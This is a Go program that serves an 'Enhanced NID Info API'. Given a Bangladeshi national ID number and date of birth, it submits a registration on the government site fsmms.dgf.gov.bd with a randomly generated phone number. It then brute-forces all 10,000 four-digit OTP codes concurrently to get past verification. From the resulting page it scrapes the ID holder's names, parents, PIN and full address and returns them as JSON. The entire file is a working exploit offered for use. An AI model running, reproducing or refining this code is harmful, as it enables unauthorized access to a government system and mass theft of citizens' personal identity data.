package main

import (
	"crypto/rand"
	"fmt"
	"io"
	mrand "math/rand"
	"math/big"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"os"
	"strings"
	"sync"
	"time"

	"github.com/PuerkitoBio/goquery"
	"github.com/gin-gonic/gin"
	"golang.org/x/net/publicsuffix"
)

// Configuration
const (
	MobilePrefix   = "016"
	BatchSize      = 500
	MaxWorkers     = 100
	TargetLocation = "http://fsmms.dgf.gov.bd/bn/step2/movementContractor/form"
)

var BaseHeaders = map[string]string{
	"User-Agent":                "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Mobile Safari/537.36",
	"Accept":                    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
	"Accept-Encoding":           "gzip, deflate, br, zstd",
	"Cache-Control":             "max-age=0",
	"sec-ch-ua":                 `"Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"`,
	"sec-ch-ua-mobile":          "?1",
	"sec-ch-ua-platform":        `"Android"`,
	"Origin":                    "https://fsmms.dgf.gov.bd",
	"Upgrade-Insecure-Requests": "1",
	"Sec-Fetch-Site":            "same-origin",
	"Sec-Fetch-Mode":            "navigate",
	"Sec-Fetch-User":            "?1",
	"Sec-Fetch-Dest":            "document",
	"Accept-Language":           "en-US,en;q=0.9",
}

// Helper functions
func randomMobile(prefix string) string {
	num, _ := rand.Int(rand.Reader, big.NewInt(100000000))
	return prefix + fmt.Sprintf("%08d", num)
}

func randomPassword() string {
	const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

	// Generate uppercase letter
	upperIdx, _ := rand.Int(rand.Reader, big.NewInt(26))
	uppercase := string('A' + byte(upperIdx.Int64()))

	// Generate 8 random characters
	result := make([]byte, 8)
	for i := range result {
		charIdx, _ := rand.Int(rand.Reader, big.NewInt(int64(len(chars))))
		result[i] = chars[charIdx.Int64()]
	}

	return "#" + uppercase + string(result)
}

func generateOTPRange() []string {
	rangeSlice := make([]string, 10000)
	for i := 0; i < 10000; i++ {
		rangeSlice[i] = fmt.Sprintf("%04d", i)
	}
	return rangeSlice
}

func shuffleOTPRange(otpRange []string) {
	mrand.Seed(time.Now().UnixNano())
	mrand.Shuffle(len(otpRange), func(i, j int) {
		otpRange[i], otpRange[j] = otpRange[j], otpRange[i]
	})
}

type SessionResult struct {
	Cookies []*http.Cookie
	Client  *http.Client
}

func getSessionAndBypass(nid, dob, mobile, email string) (*SessionResult, error) {
	jar, _ := cookiejar.New(&cookiejar.Options{PublicSuffixList: publicsuffix.List})
	client := &http.Client{
		Jar: jar,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	urlStr := "https://fsmms.dgf.gov.bd/farmers/bn/register"

	formData := url.Values{}
	formData.Set("nid", nid)
	formData.Set("dob", dob)
	formData.Set("mobile", mobile)
	if email != "" {
		formData.Set("email", email)
	}

	req, err := http.NewRequest("POST", urlStr, strings.NewReader(formData.Encode()))
	if err != nil {
		return nil, fmt.Errorf("request creation failed: %v", err)
	}

	for k, v := range BaseHeaders {
		req.Header.Set(k, v)
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("Referer", "https://fsmms.dgf.gov.bd/portal/bn/farmer/registration")

	resp, err := client.Do(req)
	if err != nil {
		return nil, fmt.Errorf("bypass request failed: %v", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode == 302 {
		location := resp.Header.Get("Location")
		if strings.Contains(location, "verification") {
			return &SessionResult{
				Cookies: resp.Cookies(),
				Client:  client,
			}, nil
		}
	}

	return nil, fmt.Errorf("bypass failed — check NID, DOB, or mobile")
}

// --- OTP functions ---
type OTPResult struct {
	OTP  string
	HTML string
}

func tryOTP(client *http.Client, cookies []*http.Cookie, otp string) *OTPResult {
	urlStr := fmt.Sprintf("https://fsmms.dgf.gov.bd/farmers/bn/verify-otp?otp1=%s&otp2=%s&otp3=%s&otp4=%s",
		string(otp[0]), string(otp[1]), string(otp[2]), string(otp[3]))

	req, err := http.NewRequest("GET", urlStr, nil)
	if err != nil {
		return nil
	}

	for k, v := range BaseHeaders {
		req.Header.Set(k, v)
	}
	req.Header.Set("Referer", "https://fsmms.dgf.gov.bd/portal/bn/farmer/otp-verification")

	for _, cookie := range cookies {
		req.AddCookie(cookie)
	}

	resp, err := client.Do(req)
	if err != nil {
		return nil
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil
	}

	htmlContent := string(body)

	if resp.StatusCode == 302 {
		location := resp.Header.Get("Location")
		if strings.Contains(location, "success") {
			return &OTPResult{OTP: otp, HTML: htmlContent}
		}
	}

	if resp.StatusCode == 200 &&
		strings.Contains(htmlContent, "কৃষক নিবন্ধন") &&
		strings.Contains(htmlContent, `name="name"`) {
		fmt.Printf("✅ Correct OTP found: %s\n", otp)
		return &OTPResult{OTP: otp, HTML: htmlContent}
	}

	return nil
}

func tryBatch(client *http.Client, cookies []*http.Cookie, otpBatch []string) *OTPResult {
	var wg sync.WaitGroup
	resultChan := make(chan *OTPResult, 1)
	done := make(chan bool, 1)

	for _, otp := range otpBatch {
		wg.Add(1)
		go func(otp string) {
			defer wg.Done()
			select {
			case <-done:
				return
			default:
				if result := tryOTP(client, cookies, otp); result != nil {
					select {
					case resultChan <- result:
						close(done)
					default:
					}
				}
			}
		}(otp)
	}

	go func() {
		wg.Wait()
		close(resultChan)
	}()

	if result, ok := <-resultChan; ok {
		return result
	}
	return nil
}

// --- Extraction and final data ---
type ExtractedData struct {
	ContractorName  string
	FatherName      string
	MotherName      string
	NameEnglish     string
	NameBangla      string
	Gender          string
	Nationality     string
	NidV1           string
	NidV2           string
	NidV3           string
	Occupation      string
	Mobile          string
	NidPerDivision  string
	NidPerDistrict  string
	NidPerUpazila   string
	NidPerUnion     string
	NidPerVillage   string
	NidPerWard      string
	NidPerZipCode   string
	NidPerPostOffice string
	NidPerHolding   string
	NidPerMouza     string
	Status          string
	LocationId      string
}

func extractFields(html string) *ExtractedData {
	doc, err := goquery.NewDocumentFromReader(strings.NewReader(html))
	if err != nil {
		return &ExtractedData{}
	}

	data := &ExtractedData{}
	data.ContractorName = doc.Find("#name").First().AttrOr("value", "")
	data.FatherName = doc.Find("#father").First().AttrOr("value", "")
	data.MotherName = doc.Find("#mother").First().AttrOr("value", "")
	data.NameEnglish = doc.Find("#name").First().AttrOr("value", "")
	data.NameBangla = doc.Find("#nameBn").First().AttrOr("value", "")
	data.Gender = doc.Find("#gender").First().AttrOr("value", "")
	data.Nationality = doc.Find("#nationality").First().AttrOr("value", "")
	data.NidV1 = doc.Find("#nidV1").First().AttrOr("value", "")
	data.NidV2 = doc.Find("#nidV2").First().AttrOr("value", "")
	data.NidV3 = doc.Find("#nidV3").First().AttrOr("value", "")
	data.Occupation = doc.Find("#occupation").First().AttrOr("value", "")
	data.Mobile = doc.Find("#mobile").First().AttrOr("value", "")
	data.NidPerDivision = doc.Find("#perDivision").First().AttrOr("value", "")
	data.NidPerDistrict = doc.Find("#perDistrict").First().AttrOr("value", "")
	data.NidPerUpazila = doc.Find("#perUpazila").First().AttrOr("value", "")
	data.NidPerUnion = doc.Find("#perUnion").First().AttrOr("value", "")
	data.NidPerVillage = doc.Find("#perVillage").First().AttrOr("value", "")
	data.NidPerWard = doc.Find("#perWard").First().AttrOr("value", "")
	data.NidPerZipCode = doc.Find("#perPostcode").First().AttrOr("value", "")
	data.NidPerPostOffice = doc.Find("#perPostOffice").First().AttrOr("value", "")
	data.NidPerHolding = doc.Find("#perAddressLine1").First().AttrOr("value", "")
	data.NidPerMouza = doc.Find("#perMouza").First().AttrOr("value", "")
	data.Status = doc.Find("#status").First().AttrOr("value", "")
	data.LocationId = doc.Find("#locationId").First().AttrOr("value", "")

	return data
}

// --- Main data enrichment ---
type FinalData struct {
	NameBangla       string `json:"nameBangla"`
	NameEnglish      string `json:"nameEnglish"`
	NationalId       string `json:"nationalId"`
	Pin              string `json:"pin"`
	DateOfBirth      string `json:"dateOfBirth"`
	FatherName       string `json:"fatherName"`
	MotherName       string `json:"motherName"`
	SpouseName       string `json:"spouseName"`
	Gender           string `json:"gender"`
	Occupation       string `json:"occupation"`
	BirthPlace       string `json:"birthPlace"`
	Nationality      string `json:"nationality"`
	Division         string `json:"division"`
	District         string `json:"district"`
	Upazila          string `json:"upazila"`
	Union            string `json:"union"`
	Village          string `json:"village"`
	Ward             string `json:"ward"`
	ZipCode          string `json:"zip_code"`
	PostOffice       string `json:"post_office"`
	PermanentAddress string `json:"permanentAddress"`
	PresentAddress   string `json:"presentAddress"`
}

func enrichData(contractorName string, result *ExtractedData, nid, dob string) *FinalData {
	mapped := &FinalData{
		NameBangla:  result.NameBangla,
		NameEnglish: result.NameEnglish,
		NationalId:  result.NidV3,
		Pin:         result.NidV1,
		DateOfBirth: dob,
		FatherName:  result.FatherName,
		MotherName:  result.MotherName,
		Gender:      result.Gender,
		Occupation:  result.Occupation,
		BirthPlace:  result.NidPerDistrict,
		Nationality: result.Nationality,
		Division:    result.NidPerDivision,
		District:    result.NidPerDistrict,
		Upazila:     result.NidPerUpazila,
		Union:       result.NidPerUnion,
		Village:     result.NidPerVillage,
		Ward:        result.NidPerWard,
		ZipCode:     result.NidPerZipCode,
		PostOffice:  result.NidPerPostOffice,
	}

	addressParts := []string{
		fmt.Sprintf("গ্রাম/রাস্তা: %s", orDefault(result.NidPerHolding, "-")),
		result.NidPerVillage,
		fmt.Sprintf("মৌজা/মহল্লা: %s", result.NidPerMouza),
		fmt.Sprintf("ইউনিয়ন ওয়ার্ড: %s", result.NidPerUnion),
		fmt.Sprintf("পোষ্ট অফিস: %s - পোষ্টকোড: %s", result.NidPerPostOffice, result.NidPerZipCode),
		fmt.Sprintf("উপজেলা: %s", result.NidPerUpazila),
		fmt.Sprintf("জেলা: %s", result.NidPerDistrict),
		fmt.Sprintf("বিভাগ: %s", result.NidPerDivision),
	}

	var filteredParts []string
	for _, part := range addressParts {
		parts := strings.Split(part, ": ")
		if len(parts) > 1 && strings.TrimSpace(parts[1]) != "" && parts[1] != "-" {
			filteredParts = append(filteredParts, part)
		}
	}

	addressLine := strings.Join(filteredParts, ", ")
	mapped.PermanentAddress = addressLine
	mapped.PresentAddress = addressLine

	return mapped
}

func orDefault(value, defaultValue string) string {
	if value == "" {
		return defaultValue
	}
	return value
}

// --- Main ---
func main() {
	gin.SetMode(gin.ReleaseMode)
	r := gin.Default()

	r.Use(func(c *gin.Context) {
		c.Header("Access-Control-Allow-Origin", "*")
		c.Header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
		c.Header("Access-Control-Allow-Headers", "Content-Type")

		if c.Request.Method == "OPTIONS" {
			c.AbortWithStatus(204)
			return
		}
		c.Next()
	})

	r.GET("/snsvapi", func(c *gin.Context) {
		c.JSON(http.StatusOK, gin.H{
			"message": "Enhanced NID Info API is running",
			"status":  "active",
			"endpoints": gin.H{
				"getInfo": "/snsvapi/get-info?nid=YOUR_NID&dob=YYYY-MM-DD",
			},
		})
	})

	r.GET("/snsvapi/get-info", func(c *gin.Context) {
		nid := c.Query("nid")
		dob := c.Query("dob")

		if nid == "" || dob == "" {
			c.JSON(http.StatusBadRequest, gin.H{
				"success": false,
				"error":   "NID and DOB are required",
			})
			return
		}

		password := randomPassword()
		mobile := randomMobile(MobilePrefix)

		sessionResult, err := getSessionAndBypass(nid, dob, mobile, password)
		if err != nil {
			c.JSON(http.StatusInternalServerError, gin.H{
				"success": false,
				"error":   err.Error(),
			})
			return
		}

		otpRange := generateOTPRange()
		shuffleOTPRange(otpRange)

		var foundOTP *OTPResult
		for i := 0; i < len(otpRange); i += BatchSize {
			end := i + BatchSize
			if end > len(otpRange) {
				end = len(otpRange)
			}
			batch := otpRange[i:end]

			foundOTP = tryBatch(sessionResult.Client, sessionResult.Cookies, batch)
			if foundOTP != nil {
				break
			}
		}

		if foundOTP != nil {
			extractedData := extractFields(foundOTP.HTML)
			finalData := enrichData(
				extractedData.ContractorName,
				extractedData,
				nid,
				dob,
			)

			c.JSON(http.StatusOK, gin.H{
				"success": true,
				"data":    finalData,
				"sessionInfo": gin.H{
					"mobileUsed": mobile,
					"otpFound":   foundOTP.OTP,
				},
			})
		} else {
			c.JSON(http.StatusNotFound, gin.H{
				"success": false,
				"error":   "OTP not found after trying all combinations",
			})
		}
	})

	r.GET("/snsvapi/health", func(c *gin.Context) {
		c.JSON(http.StatusOK, gin.H{
			"status":    "OK",
			"timestamp": time.Now().UTC().Format(time.RFC3339),
			"service":   "Enhanced NID Info API",
			"version":   "2.0.0",
		})
	})

	r.GET("/snsvapi/test-creds", func(c *gin.Context) {
		mobile := randomMobile(MobilePrefix)
		password := randomPassword()
		c.JSON(http.StatusOK, gin.H{
			"mobile":   mobile,
			"password": password,
			"note":     "Randomly generated test credentials",
		})
	})

	port := os.Getenv("PORT")
	if port == "" {
		port = "3000"
	}

	fmt.Printf("🚀 Enhanced NID Info API running on port %s\n", port)
	fmt.Printf("📍 Main endpoint: http://localhost:%s/snsvapi/get-info?nid=YOUR_NID&dob=YYYY-MM-DD\n", port)
	fmt.Printf("🔧 Test endpoint: http://localhost:%s/snsvapi/test-creds\n", port)
	fmt.Printf("❤️  Health check: http://localhost:%s/snsvapi/health\n", port)

	if err := r.Run(":" + port); err != nil {
		panic(fmt.Sprintf("Failed to start server: %v", err))
	}
}
